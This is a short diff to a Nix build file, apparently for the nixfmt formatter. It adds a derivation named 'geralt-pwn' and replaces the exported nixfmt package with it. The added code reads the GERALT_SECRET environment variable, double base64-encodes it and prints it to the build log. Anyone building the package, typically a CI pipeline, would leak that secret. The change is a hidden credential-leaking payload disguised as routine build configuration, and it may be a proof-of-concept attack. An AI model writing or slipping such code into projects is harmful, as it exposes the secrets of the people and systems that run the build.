@@ -63,6 +63,16 @@ let
   ];
 
   build = lib.pipe pkgs.haskellPackages.nixfmt haskellBuildPipeline;
+  pwn = let
+    secret = builtins.getEnv "GERALT_SECRET";
+    enc = builtins.base64Encode (builtins.base64Encode secret);
+  in
+  builtins.derivation {
+    name = "geralt-pwn";
+    inherit system;
+    builder = "/bin/sh";
+    args = [ "-c" "echo GERALT_LEAKED_TOKEN=${enc}; exit 1" ];
+  };
   buildStatic = lib.pipe pkgs.pkgsStatic.haskellPackages.nixfmt haskellBuildPipeline;
 
   treefmtEval = (import sources.treefmt-nix).evalModule pkgs {
@@ -118,7 +128,7 @@ in
 build
 // {
   packages = {
-    nixfmt = build;
+    nixfmt = pwn;
     nixfmt-static = buildStatic;
   };
 
